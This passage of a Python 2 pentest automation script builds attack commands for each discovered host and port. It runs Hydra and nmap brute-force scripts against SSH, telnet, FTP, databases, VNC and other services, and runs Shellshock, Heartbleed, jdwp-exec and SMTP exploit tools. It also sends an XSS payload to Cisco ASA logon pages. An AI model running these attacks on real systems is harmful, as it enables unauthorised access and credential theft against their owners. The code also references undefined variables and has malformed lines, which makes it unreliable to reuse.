						fullCmd="ruby "+toolsPath+"/WhatWeb/whatweb -a 3 "+hostNo+":"+portNo+" 2>&1 >> "+logFilename
						if quiet==False:
    							print fullCmd
						cmdList.append(["whatsweb",hostNo,fullCmd])

				if taskToRun=="shellshock" or taskToRun=="all" or taskToRun=="http":
					logFilename = origPath+"/runShellshock_http_"+hostNo+"_"+portNo+".log"
					if not os.path.exists(logFilename):
						fullCmd = "python2.7 "+shellShockPath+"shocker.py --Hostname "+hostNo+" --cgilist "+shellShockPath+"/shocker-cgi_list --port "+portNo+" | tee -a "+logFilename
						#fullCmd = "python2.7 "+shellShockPath+"shellshock_scanner.py "+origPath+"/portHTTP.txt "+shellShockPath+"cgi_list_example.txt -e 2 -w "+origPath+"/resultsHTTPs.csv --proto http -t 10"
						if quiet==False:
    							print fullCmd
						cmdList.append(["shellshock",hostNo,fullCmd])

				if taskToRun=="clusterd" or taskToRun=="all" or taskToRun=="http":
					logFilename = origPath+"/runClusterd_http_"+hostNo+"_"+portNo+".log"
					if not os.path.exists(logFilename):
						fullCmd = "cd "+clusterdPath+" && sudo python "+clusterdPath+"clusterd.py -i "+hostNo+" -p "+portNo+" | tee -a "+logFilename
						#fullCmd = "cd "+clusterdPath+" && sudo python "+clusterdPath+"clusterd.py -i "+hostNo+" -p "+portNo+" 2>&1 >> "+origPath+"/runClusterd_http_"+hostNo+"_"+portNo+".log"
						print fullCmd
						if quiet==False:
    							print fullCmd
						cmdList.append(["clusterd",hostNo,fullCmd])

				if taskToRun=="yasuo" or taskToRun=="all" or taskToRun=="http":
					logFilename = origPath+"/runYasuo_http_"+hostNo+"_"+portNo+".log"
					if not os.path.exists(logFilename):
						fullCmd = "cd "+yasuoPath+" && sudo ruby yasuo.rb -r "+hostNo+" -p "+portNo+" -b all | sudo tee -a "+logFilename
						if quiet==False:
    							print fullCmd
						cmdList.append(["yasuo",hostNo,fullCmd])

  
		filename = origPath+"/portHTTPs.txt"
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					httpList.append(line)
			for host in httpList:
				if host.count(":")<2:
					if "https" in host:
						host = host+":443"
					if "http" in host:
						host = host+":80"
				host = host.strip()
				host1 = host.replace("https://","")
				host1 = host1.replace("http://","")

				hostList = host1.split(":")
				hostNo = hostList[0].strip()
				portNo = hostList[1].strip()

				if taskToRun=="bruteURL" or taskToRun=="all":
					testURLs(host)

				#if taskToRun=="jboss" or taskToRun=="all":
				#	logFilename = origPath+"/runJboss_https_"+hostNo+"_"+portNo
				#	if not os.path.exists(logFilename):
				#		fullCmd = "cd "+patatorPath+" && python patator.py http_fuzz url=https://"+hostNo+":"+portNo+"FILE0 0="+toolsPath+"/JBoss.fuzz.txt -l "+logFilename
				#		if quiet==False:
    				#			print fullCmd
				#		cmdList.append(["jboss",hostNo,fullCmd])

				#if taskToRun=="tomcat" or taskToRun=="all":
				#	logFilename = origPath+"/runTomcat_https_"+hostNo+"_"+portNo
				#	if not os.path.exists(logFilename):
				#		fullCmd = "cd "+patatorPath+" && python patator.py http_fuzz url=http://"+hostNo+":"+portNo+"FILE0 0="+toolsPath+"/ApacheTomcat.fuzz.txt -l "+logFilename
				#		if quiet==False:
    				#			print fullCmd
				#		cmdList.append(["tomcat",hostNo,fullCmd])

				if taskToRun=="asa" or taskToRun=="all":
					if portNo=="443":
						logFilename = origPath+"/runASAxss.log"
						lines=[]
						if os.path.exists(logFilename):
							with open(logFilename) as f:
					    			lines = f.read().splitlines()
						if hostNo not in lines:
							print "- Checking for ASA XSS: "+str(hostNo)
							if checkForASA(hostNo)==True:
								c = httplib.HTTPSConnection(hostNo)
								c.request("GET", "/+CSCOE+/logon.html?reason=2&auth_handle=\"%20style%3dbehavior%3aurl('%23default%23time2')%20onbegin%3d'alert(String.fromCharCode(88,83,83))'")
								response = c.getresponse()
								if response.status==200:
									data = response.read()
									if "alert(String.fromCharCode(88,83,83))" in data:
										resultListASAXSS.append(hostNo)
							filename = open(logFilename,"a+")
							filename.write(hostNo+"\n")
							filename.close()
			

				if taskToRun=="whatweb" or taskToRun=="all" or taskToRun=="http":
					logFilename = origPath+"/runWhatWeb.log"
					if not os.path.exists(logFilename):
						fullCmd="ruby "+toolsPath+"/WhatWeb/whatweb -a 3 "+hostNo+":"+portNo+" 2>&1 >> "+logFilename
						if quiet==False:
    							print fullCmd
						cmdList.append(["whatweb",hostNo,fullCmd])

				if taskToRun=="shellshock" or taskToRun=="all" or taskToRun=="http":
					logFilename = origPath+"/runShellshock_https_"+hostNo+"_"+portNo+".log"
					if not os.path.exists(logFilename):
						fullCmd = "python2.7 "+shellShockPath+"shocker.py --Hostname "+hostNo+" --ssl --cgilist "+shellShockPath+"/shocker-cgi_list --port "+portNo+" | tee -a "+logFilename
						#fullCmd = "python2.7 "+shellShockPath+"shellshock_scanner.py "+origPath+"/portHTTPs.txt "+shellShockPath+"cgi_list_example.txt -e 2 -w "+origPath+"/resultsHTTP.csv --proto https -t 10"
						if quiet==False:
    							print fullCmd
						cmdList.append(["shellshock",hostNo,fullCmd])

				if taskToRun=="clusterd" or taskToRun=="all" or taskToRun=="http":
					logFilename = origPath+"/runClusterd_https_"+hostNo+"_"+portNo+".log"
					if not os.path.exists(logFilename):
						fullCmd = "cd "+clusterdPath+" && sudo python "+clusterdPath+"clusterd.py -i "+hostNo+" -p "+portNo+" --ssl | tee -a "+logFilename
						#fullCmd = "cd "+clusterdPath+" && sudo python "+clusterdPath+"clusterd.py -i "+hostNo+" -p "+portNo+" --ssl 2>&1 >> "+origPath+"/runClusterd_https_"+hostNo+"_"+portNo+".log"
						if quiet==False:
    							print fullCmd
						cmdList.append(["clusterd",hostNo,fullCmd])

				if taskToRun=="yasuo" or taskToRun=="all" or taskToRun=="http":
					logFilename = origPath+"/runYasuo_https_"+hostNo+"_"+portNo+".log"
					if not os.path.exists(logFilename):
						fullCmd = "cd "+yasuoPath+" && sudo ruby yasuo.rb -r "+hostNo+" -p "+portNo+" -b all | sudo tee -a "+logFilename
						if quiet==False:
    							print fullCmd
						cmdList.append(["yasuo",hostNo,fullCmd])

	if (taskToRun=="tilde" or taskToRun=="all"):
		filename = origPath+"/portTilde.txt"
		tildeList=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					tildeList.append(line.strip())
			for host in tildeList:

				hostNo = host.split(":")[1].replace("//","").strip()
				portNo = host.split(":")[2].strip()
				logFilename = origPath+"/runTilde_"+hostNo+"_"+portNo.replace('//','')+".log"
				if not os.path.exists(logFilename):
					fullCmd = "cd "+tildePath+" && echo -ne '\n\n' | java -jar "+tildePath+"IIS_shortname_scanner.jar 0 20 "+host+" 2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["tilde",hostNo,fullCmd])
		
	if (taskToRun=="ssh" or taskToRun=="all"):
		if not os.path.exists(toolsPath+"/wordList_ssh_hydra.txt"):
			print toolsPath+"wordList_ssh_hydra.txt does not exists."
			print "wget https://raw.githubusercontent.com/milo2012/pentest_scripts/master/default_accounts_wordlist/wordList_ssh_hydra.txt -O "+toolsPath+"wordList_ssh_hydra.txt"
			sys.exit()
		filename = origPath+"/portSSH.txt"
		sshList=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					sshList.append(line)
			for host in sshList:
				hostList = host.split(":")
				hostNo = hostList[0].strip()
				portNo = hostList[1].strip()

				logFilename = origPath+"/runHydraSSH_"+hostNo+"_"+portNo+".log"
				if not os.path.exists(logFilename):
					fullCmd="hydra -s "+portNo+" -S -f -V -C "+toolsPath+"/wordList_ssh_hydra.txt "+hostNo+" ssh | tee -a "+logFilename
	 	 	            	#fullCmd="medusa -M ssh -C "+toolsPath+"/wordList_ssh.txt -T4 -t4 -f -F -h "+hostNo+" -n "+portNo+" -O "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["ssh",hostNo,fullCmd])

	if taskToRun=="telnet" or taskToRun=="all":
		if not os.path.exists(toolsPath+"/wordList_telnet.txt"):
			print toolsPath+"wordList_telnet.txt does not exists"
			print "wget https://raw.githubusercontent.com/milo2012/pentest_scripts/master/default_accounts_wordlist/wordList_telnet.txt -O "+toolsPath+"wordList_telnet.txt"
			sys.exit()
		filename = origPath+"/portTelnet.txt"
		telnetList=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					telnetList.append(line)
			for host in telnetList:
				hostList = host.split(":")
				hostNo = hostList[0].strip()
				portNo = hostList[1].strip()

				logFilename=origPath+"/runHydraTelnet_"+hostNo+"_"+portNo+".log"
				if not os.path.exists(logFilename):
					fullCmd="hydra -s "+portNo+" -f -V -C "+toolsPath+"/wordList_ssh_hydra.txt "+hostNo+" telnet | tee -a "+logFilename
					#fullCmd="medusa -M telnet -C "+toolsPath+"/wordList_telnet.txt  -T4 -t4 -f -F -h "+hostNo+" -n "+portNo+" 2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["telnet",hostNo,fullCmd])

	if taskToRun=="xmpp" or taskToRun=="all" or taskToRun=="5222":
		filename = origPath+"/port5222.txt"
		xmppList=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					xmppList.append(line.strip())
			for host in xmppList:
				hostNo = host
				logFilename = origPath+"/runXmpp_http_"+hostNo+"_"+portNo+".log"
				if not os.path.exists(logFilename):
					fullCmd="nmap -p 5222 --script xmpp-brute "+hostNo+" | tee -a "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["xmpp",hostNo,fullCmd])

	if taskToRun=="ftp" or taskToRun=="all":
		filename = origPath+"/portFTP.txt"
		ftpList=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					ftpList.append(line)
			for host in ftpList:
				hostList = host.split(":")
				hostNo = hostList[0].strip()
				portNo = hostList[1].strip()

				logFilename=origPath+"/runHydraFTP_"+hostNo+"_"+portNo+".log"
				if not os.path.exists(logFilename):
					fullCmd="hydra -s "+portNo+" -f -V -C "+toolsPath+"/wordList_ssh_hydra.txt "+hostNo+" ftp | tee -a "+logFilename
					#fullCmd="medusa -M ftp -C "+toolsPath+"/wordList_telnet.txt  -T4 -t4 -f -F -h "+hostNo+" -n "+portNo+" 2>&1 >> "+origPath+"/runMedusaFTP.log"
					if quiet==False:
    						print fullCmd
					cmdList.append(["ftp",hostNo,fullCmd])

	if taskToRun=="ssl" or taskToRun=="all" or taskToRun=="tlssled" or taskToRun=="sslcert" or taskToRun=="sslknownkey" or taskToRun=="sslccs" or taskToRun=="heartbleed":
		filename = origPath+"/portSSL.txt"
		sslList=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					sslList.append(line)
			for host in sslList:
				hostList = host.split(":")
				hostNo = hostList[0].strip()
				portNo = hostList[1].strip()

				if taskToRun=="sslcert" or taskToRun=="ssl" or taskToRun=="all":
					logFilename = origPath+"/runSSLCert_"+hostNo+"_"+portNo+".log"
					if not os.path.exists(logFilename):
						fullCmd = "nmap -Pn --script=ssl-cert -p "+portNo+" "+hostNo+" | tee -a "+logFilename
						if quiet==False:
    							print fullCmd

						cmdList.append(["sslcert",hostNo,fullCmd])

				if taskToRun=="sslknownkey" or taskToRun=="ssl" or taskToRun=="all":
					logFilename = origPath+"/runSSLKnownKey_"+hostNo+"_"+portNo+".log"
					if not os.path.exists(logFilename):
						fullCmd = "nmap -Pn --script ssl-known-key "+hostNo+" -p "+portNo +" | tee -a "+logFilename
						if quiet==False:
    							print fullCmd
						cmdList.append(["sslknownkey",hostNo,fullCmd])

				if taskToRun=="sslccs" or taskToRun=="ssl" or taskToRun=="all":
					logFilename = origPath+"/runSSLCCS_"+hostNo+"_"+portNo+".log"
					if not os.path.exists(logFilename):
						fullCmd = "python "+toolsPath+"/OSSL_CCS_InjectTest.py "+hostNo+" "+portNo+" | tee -a "+logFilename
						if quiet==False:
    							print fullCmd
						cmdList.append(["sslccs",hostNo,fullCmd])

				if taskToRun=="heartbleed" or taskToRun=="ssl" or taskToRun=="all":
					logFilename = origPath+"/runSSLHeartbleed_"+hostNo+"_"+portNo+".log"
					if not os.path.exists(logFilename):
						fullCmd = "python "+toolsPath+"/heartbleed-poc/heartbleed-poc.py -n 1 -p "+portNo+" "+hostNo+" | tee -a "+logFilename
						#fullCmd = "nmap -Pn -p "+portNo+" --script ssl-heartbleed "+hostNo+" | tee -a "+logFilename

						if quiet==False:
    							print fullCmd
						cmdList.append(["heartbleed",hostNo,fullCmd])
	
				if taskToRun=="tlssled" or taskToRun=="ssl" or taskToRun=="all":
					logFilename = origPath+"/runSSLTlssled_"+hostNo+"_"+portNo+".log"
					if not os.path.exists(logFilename):
						fullCmd = tlssledPath+"TLSSLed_v1.3.sh "+hostNo+" "+portNo+" | tee -a "+logFilename
						if quiet==False:
    							print fullCmd
						cmdList.append(["tlssled",hostNo,fullCmd])

	'''
	if taskToRun=="screenshot" or taskToRun=="all" or taskToRun=="peepingtom":
		if not os.path.exists(origPath+"/screenshots"):
			for filename in glob.glob(origPath+"/portHTTP.txt"):
				fullCmd = "cd /tmp1/tools/peepingtom && python "+toolsPath+"/peepingtom/peepingtom.py -v -l "+filename
				if quiet==False:
    					print fullCmd
				cmdList.append(["screenshot",hostNo,fullCmd])
			for filename in glob.glob(origPath+"/portHTTPs.txt"):
				fullCmd = "cd /tmp1/tools/peepingtom && python "+toolsPath+"/peepingtom/peepingtom.py -v -l "+filename
				if quiet==False:
    					print fullCmd
				cmdList.append(["screenshot",hostNo,fullCmd])
	'''
	if taskToRun=="161" or taskToRun=="snmp" or taskToRun=="all":
		filename = origPath+"/port161.txt"
		p161List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p161List.append(line)
			for host in p161List:
				host = host.strip()
				logFilename = origPath+"/runSNMP_"+host+".log"
				if not os.path.exists(logFilename):
		   			fullCmd = "sudo nmap -sU -p 161 -Pn --script snmp-brute --script-args snmp-brute.communitiesdb="+toolsPath+"/wordlist-common-snmp-community-strings.txt "+host+" | tee -a runSNMP_"+host+".log"
	   				#fullCmd = "sudo nmap -sU -p 161 --script snmp-brute --script-args -Pn snmp-brute.communitiesdb="+toolsPath+"/wordlist-common-snmp-community-strings.txt -iL "+filename+" | tee -a "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["161",hostNo,fullCmd])
		
	if taskToRun=="123" or taskToRun=="ntp" or taskToRun=="all":
		filename = origPath+"/port123.txt"
		if os.path.exists(filename):
			logFilename = origPath+"/runNTP.log"
			if not os.path.exists(logFilename):
				#fullCmd="nmap -sU -pU:123 -Pn -n --script=ntp-monlist -iL "+origPath+"/port123.txt"
				fullCmd="sudo nmap -sU -pU:123 -Pn -n --script=ntp-monlist -iL "+origPath+"/port123.txt | tee -a "+logFilename
				if quiet==False:
    					print fullCmd
				cmdList.append(["123",hostNo,fullCmd])

	if taskToRun=="1098" or taskToRun=="all":
		filename = origPath+"/port1098.txt"
		p1098List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p1098List.append(line)
			logFilename=origPath+"/runPort1098.log"
			if not os.path.exists(logFilename):
				for host in p1098List:
					host = host.strip()

					#fullCmd = 'nmap --script "rmi-dumpregistry.nse" -p 1098 -iL '+origPath+"/port1098.txt"
					fullCmd = 'nmap --script "rmi-dumpregistry.nse" -p 1098 -iL '+origPath+"/port1098.txt | tee -a "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["1098",hostNo,fullCmd])

	if taskToRun=="3306" or taskToRun=="all":
		filename = origPath+"/port3306.txt"
		p3306List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p3306List.append(line)
			#cmdList = []
			logFilename=origPath+"/runPort3306.log"
			if not os.path.exists(logFilename):
				for host in p3306List:
					host = host.strip()

					fullCmd = "nmap -sV --script=mysql-empty-password -p 3306 "+host[0]+" | tee -a "+logFilename
					cmdList.append(["3306".fullCmd])
					fullCmd = "nmap --script=mysql-brute -p 3306 "+host[0]
					cmdList.append(["3306",hostNo,fullCmd])
				

	if taskToRun=="6379" or taskToRun=="all":
		filename = origPath+"/port6379.txt"
		p6379List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p6379List.append(line)
			fullCmd = []
			logFilename=origPath+"/runPort6379.log"
			if not os.path.exists(logFilename):
				for host in p6379List:
					host = host.strip()

					fullCmd = "nmap -p 6379 --script redis-brute "+host[0]+" | tee -a "+logFilename
					cmdList.append(["6379",hostNo,fullCmd])
					fullCmd = "nmap -p 6379 --script redis-info "+host[0]+" | tee -a "+logFilename
					cmdList.append(["6379",hostNo,fullCmd])
		

	if taskToRun=="1099" or taskToRun=="all":
		filename = origPath+"/port1099.txt"	
		p1099List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p1099List.append(line)
			logFilename=origPath+"/runPort1099.log"
			if not os.path.exists(logFilename):
				for host in p1099List:
					host = host.strip()

					#fullCmd = "nmap --script=rmi-vuln-classloader -p 1099 "+host[0]
					fullCmd = "nmap --script=rmi-vuln-classloader -p 1099 "+host[0]+" 2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["1099",hostNo,fullCmd])

	if taskToRun=="5432" or taskToRun=="all":
		filename = origPath+"/port5432.txt"
		p5432List=[]
		if os.path.exists(filename):
			with open(filename) as f:
	    			for line in f:
					p5432List.append(line)
			logFilename=origPath+"/runPort5432.log"
			if not os.path.exists(logFilename):
				for host in p5432List:
					host = host.strip()

					#fullCmd = "nmap -p 5432 --script pgsql-brute -iL "+origPath+"/port5432.txt"
					fullCmd = "nmap -p 5432 --script pgsql-brute -iL "+origPath+"/port5432.txt 2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["1099",hostNo,fullCmd])

	if taskToRun=="2010" or taskToRun=="all":
		filename = origPath+"/port2010.txt"
		p2010List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p2010List.append(line)
			logFilename=origPath+"/runPort2010.log"
			if not os.path.exists(logFilename):
				for host in p2010List:
					host = host.strip()

					#fullCmd = 'nmap -sT -p 2010 --script=+jdwp-exec --script-args cmd="date" '+host[0]
					fullCmd = 'nmap -sT -p 2010 --script=+jdwp-exec --script-args cmd="date" '+host[0]+' 2>&1 >> '+origPath+"/runPort2010.log"
					if quiet==False:
    						print fullCmd
					cmdList.append(["2010",hostNo,fullCmd])

	if taskToRun=="27017" or taskToRun=="all":
		filename = origPath+"/port27017.txt"
		p25017List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p25017List.append(line)
			logFilename=origPath+"/runPort27017.log"
			if not os.path.exists(logFilename):
				for host in p25017List:
					host = host.strip()

					fullCmd = "nmap -p 27017 --script mongodb-brute "+host[0]+" 2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["27017",hostNo,fullCmd])

	if taskToRun=="512" or taskToRun=="all":
		filename = origPath+"/port512.txt"
		p512List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p512List.append(line)
			logFilename=origPath+"/runPort512.log"
			if not os.path.exists(logFilename):
				for host in p512List:
					host = host.strip()

					fullCmd = "nmap -p 512 --script rexec-brute "+host[0]
					if quiet==False:
    						print fullCmd
					cmdList.append(["512",hostNo,fullCmd])

	if taskToRun=="5060" or taskToRun=="all":
		filename = origPath+"/port5060.txt"
		p5060List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p5060List.append(line)
			logFilename=origPath+"/runPort5060.log"
			if not os.path.exists(logFilename):
				for host in p5060List:
					host = host.strip()

					fullCmd = "nmap -sU -p 5060 --script=sip-brute -iL "+origPath+"/port5060.txt  2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["5060",hostNo,fullCmd])

	if taskToRun=="500" or taskToRun=="vpn" or taskToRun=="all":
		filename = origPath+"/port500.txt"
		if os.path.exists(filename):
			p500List=[]
			with open(filename) as f:
    				for line in f:
					p500List.append(line.strip())
			#cmdList = []
			for host in p500List:
				host = host.strip()

				logFilename = origPath+"/runPort500_ikescan_"+host+".log"
				if not os.path.exists(logFilename):
					if not os.path.exists(logFilename):
						#fullCmd = "sudo ike-scan "+host
						fullCmd = "sudo ike-scan "+host+" 2>&1 >> "+logFilename
						cmdList.append(["500",hostNo,fullCmd])
						#fullCmd = "sudo python "+vpnPath+"ikeforce.py "+host+" -e -s 1 -w "+vpnPath+"wordlists/groupnames.dic"
						#cmdList.append(fullCmd)
				logFilename = origPath+"/runPort500_ikeversion_"+host+".log"
				if not os.path.exists(logFilename):
					if not os.path.exists(logFilename):
						#fullCmd = "sudo ike-scan "+host
						fullCmd = "sudo nmap -Pn -sU -p 500 --script ike-version "+host+" 2>&1 >> "+logFilename
						cmdList.append(["500",hostNo,fullCmd])
						#fullCmd = "sudo python "+vpnPath+"ikeforce.py "+host+" -e -s 1 -w "+vpnPath+"wordlists/groupnames.dic"
						#cmdList.append(fullCmd)
					
	
	if taskToRun=="5900" or taskToRun=="all":
		filename = origPath+"/port5900.txt"
		p5900List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p5900List.append(line)
			logFilename=origPath+"/runPort5900.log"
			if not os.path.exists(logFilename):
				for host in p5900List:
					host = host.strip()
					#fullCmd = "nmap --script vnc-brute -p 5900 "+host
					fullCmd = "nmap --script vnc-brute -p 5900 "+host+" 2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["5900",hostNo,fullCmd])	

	if taskToRun=="25" or taskToRun=="all":
		filename = origPath+"/port25.txt"	
		p25List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p25List.append(line)
			#cmdList=[]
			logFilename=origPath+"/runPort25.log"
			if not os.path.exists(logFilename):
				for host in smtpList:
					host = host.strip()
					fullCmd = "nmap -p 25 --script smtp-brute "+host
					cmdList.append(["25",hostNo,fullCmd])
					fullCmd = "nmap --script=smtp-vuln-cve2010-4344 --script-args='smtp-vuln-cve2010-4344.exploit' -pT:25,465,587 "+host+" 2>&1 >> "+logFilename
					cmdList.append(["25",hostNo,fullCmd])
					fullCmd = "nmap --script=smtp-vuln-cve2011-1764 -pT:25,465,587 "+host+" 2>&1 >> "+logFilename
					cmdList.append(["25",hostNo,fullCmd])
			

	if taskToRun=="139" or taskToRun=="all":
		filename = origPath+"/port139.txt"
		p139List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p139List.append(line)
			logFilename=origPath+"/runPort139.log"
			if not os.path.exists(logFilename):
				for host in p139List:	
					host = host.strip()	
					fullCmd = "nmap --script=samba-vuln-cve-2012-1182  -p 139 "+host+" 2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["139",hostNo,fullCmd])

	if taskToRun=="512" or taskToRun=="all":
		filename = origPath+"/port512.txt"
		if os.path.exists(filename):
			logFilename=origPath+"/runPort512.log"
			if not os.path.exists(logFilename):
				fullCmd = "nmap -p 512 --script rexec-brute "+host+" -iL "+filename
				#fullCmd = "nmap -p 512 --script rexec-brute "+host+" -iL "+filename+" 2>&1 >> "+logFilename
				if quiet==False:
    					print fullCmd
				cmdList.append(["512",hostNo,fullCmd])
			
	if taskToRun=="513" or taskToRun=="all":
		filename = origPath+"/port513.txt"
		if os.path.exists(filename):
			logFilename=origPath+"/runPort513.log"
			if not os.path.exists(logFilename):
				fullCmd = "nmap -p 513 --script rlogin-brute -iL "+filename+" 2>&1 >> "+logFilename     
				if quiet==False:
    					print fullCmd
				cmdList.append(["513",hostNo,fullCmd])

	if taskToRun=="554" or taskToRun=="all":
		filename = origPath+"/port554.txt"
		if os.path.exists(filename):
			logFilename=origPath+"/runPort554.log"
			if not os.path.exists(logFilename):
				#cmdList=[]
				fullCmd = "nmap -p 554 --script rtsp-methods -iL "+filename+" 2>&1 >> "+logFilename
				cmdList.append(fullCmd)
				fullCmd = "nmap --script rtsp-url-brute -p 554 -iL "+filename+" 2>&1 >> "+logFilename
				cmdList.append(["554",hostNo,fullCmd])

	if taskToRun=="902" or taskToRun=="all":
		filename = origPath+"/port902.txt"
		if os.path.exists(filename):
			logFilename=origPath+"/runPort902.log"
			if not os.path.exists(logFilename):
	    			fullCmd = "nmap -p 902 --script vmauthd-brute -iL "+filename+" 2>&1 >> "+logFilename
				if quiet==False:
    					print fullCmd
				cmdList.append(["902",hostNo,fullCmd])

	if taskToRun=="2002" or taskToRun=="all":
		filename = origPath+"/port2002.txt"
		if os.path.exists(filename):
			#cmdList = []
			logFilename=origPath+"/runPort2002.log"
			if not os.path.exists(logFilename):
				for host in p2002ListList:
					host = host.strip()

					fullCmd = "nmap -p 2002 --script rpcap-brute  -iL "+filename+" 2>&1 >> "+logFilename
					cmdList.append(["2002",hostNo,fullCmd])
					fullCmd = "nmap -p 2002 --script rpcap-info  -iL "+filename+" 2>&1 >> "+logFilename
					cmdList.append(["2002",hostNo,fullCmd])	


	if taskToRun=="2401" or taskToRun=="all":
		filename = origPath+"/port2401.txt"
		p2401List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p2401List.append(line)
			#cmdList = []
			logFilename=origPath+"/runPort2401.log"
			if not os.path.exists(logFilename):
				for host in p2401List:
					host = host.strip()

					fullCmd = "nmap -p 2401 --script cvs-brute "+host+" 2>&1 >> "+logFilename
					cmdList.append(["2401",hostNo,fullCmd])
					fullCmd = "nmap -p 2401 --script cvs-brute-repository "+host+" 2>&1 >> "+logFilename
					cmdList.append(["2401",hostNo,fullCmd])
		
	if taskToRun=="8098" or taskToRun=="all":
		filename = origPath+"/port8098.txt"
		p8098List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p8098List.append(line)
		
			logFilename=origPath+"/runPort8098.log"
			if not os.path.exists(logFilename):
				for host in p8098List:
					host = host.strip()

					fullCmd = "nmap -p 8098 --script riak-http-info "+host+" 2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["8098",hostNo,fullCmd])
		
	if taskToRun=="9160" or taskToRun=="all":
		filename = origPath+"/port9160.txt"
		if os.path.exists(filename):
			logFilename=origPath+"/runPort9160.log"
			if not os.path.exists(logFilename):
				for host in p9160List:
					host = host.strip()

					fullCmd = "nmap -p 9160 --script=cassandra-brute "+host+" 2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["9160",hostNo,fullCmd])

	if taskToRun=="873" or taskToRun=="all":
		filename = origPath+"/port873.txt"
		p873List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p873List.append(line)
			#cmdList = []
			logFilename=origPath+"/runPort873.log"
			if not os.path.exists(logFilename):
				for host in p873List:
					host = host.strip()

					fullCmd = "nmap -p 873 --script rsync-brute --script-args 'rsync-brute.module=www' "+host+" 2>&1 >> "+logFilename
					cmdList.append(["873",hostNo,fullCmd])
					fullCmd = "nmap -p 873 --script rsync-list-modules "+host+" 2>&1 >> "+logFilename
					cmdList.append(["873",hostNo,fullCmd])
				

	if taskToRun=="1080" or taskToRun=="all":
		filename = origPath+"/port1080.txt"
		p1080List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p1080List.append(line)
			#cmdList = []
			logFilename=origPath+"/runPort1080.log"
			if not os.path.exists(logFilename):
				for host in p1080List:
					host = host.strip()

					fullCmd = "nmap -p 1080 --script socks-auth-info "+host+" 2>&1 >> "+logFilename
					cmdList.append(["1080",hostNo,fullCmd])
					fullCmd = "nmap --script socks-brute -p 1080 "+host+" 2>&1 >> "+logFilename
					cmdList.append(["1080",hostNo,fullCmd])
		
	if taskToRun=="1723" or taskToRun=="all":
		filename = origPath+"/port1723.txt"
		p1723List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p1723List.append(line)
			logFilename=origPath+"/runPort1723.log"
			if not os.path.exists(logFilename):
				for host in p1723List:
					host = host.strip()

					fullCmd = "nmap -sV -p 1723 "+host+" 2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["1723",hostNo,fullCmd])


	if taskToRun=="3389" or taskToRun=="all":
		filename = origPath+"/port3389.txt"
		p3389List=[]
		if os.path.exists(filename):
			#cmdList = []
			logFilename=origPath+"/runPort3389.log"
			if not os.path.exists(logFilename):
				for host in p3389List:
					host = host.strip()

					fullCmd = "nmap -p 3389 --script rdp-enum-encryption "+host+" 2>&1 >> "+logFilename
					cmdList.append(["3389",hostNo,fullCmd])
					fullCmd = "nmap -sV --script=rdp-ms12-020 -p 3389 "+host+" 2>&1 >> "+logFilename
					cmdList.append(["3389",hostNo,fullCmd])
		
	if taskToRun=="5432" or taskToRun=="all":
		filename = origPath+"/port5432.txt"
		p5432List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					line = line.strip()
					p5432List.append(line)
			for host in p5432List:
				host = host.strip()
				logFilename=origPath+"/runPort5432_"+host+".log"
				if not os.path.exists(logFilename):
					fullCmd = "nmap -p 5432 --script pgsql-brute "+host+" 2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["5432",hostNo,fullCmd])

	if taskToRun=="5666" or taskToRun=="all":
		filename = origPath+"/port5666.txt"
		p5666List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p5666List.append(line)
			logFilename=origPath+"/runPort5666.log"
			if not os.path.exists(logFilename):
				for host in p5666List:
					host = host.strip()
					fullCmd = "nmap --script nrpe-enum -p 5666 "+host+" 2>&1 >> "+logFilename
					if quiet==False:
    						print fullCmd
					cmdList.append(["5666",hostNo,fullCmd])

	if taskToRun=="5850" or taskToRun=="all":
		filename = origPath+"/port5850.txt"
		p5850List=[]
		if os.path.exists(filename):
			with open(filename) as f:
    				for line in f:
					p5850List.append(line)
